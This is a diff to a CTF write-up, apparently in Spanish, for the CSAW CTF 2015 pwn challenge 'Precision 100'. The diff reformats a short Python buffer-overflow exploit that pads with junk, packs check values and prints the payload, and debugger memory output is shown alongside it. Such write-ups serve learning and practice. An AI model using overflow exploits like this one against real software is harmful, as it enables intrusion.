@@ -136,8 +136,9 @@ hit breakpoint at: 8048543
 0xffda4c60  0100 0000 244d daff 2c4d daff a591 d7f7  ....$M..,M......
 0xffda4c70  a029 f6f7 0000 0000 a531 5a47 5515 5040  .).......1ZGU.P@
 </code></pre>
-<h4>[Exploit]:</h4><pre><code>import struct
-
+<h4>[Exploit]:</h4>
+```python
+import struct
 
 data = lambda data: struct.pack("I", data)
 junk = "AAAAAABBBBBCCCCCDDDEEFFGGHHIIJJKKLLMM"
@@ -147,7 +148,8 @@ payload += data(0x475a31a5)
 payload += data(0x40501555)
 payload += junk
 
-print payload</code></pre>
+print payload
+```
 <h4>[URL Reto]:</h4><p><a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/precision_a8f6f0590c177948fe06c76a1831e650">--Precision100 CSAW CTF 2015--</a></p>
 <p>[Continuara...]</p>
 
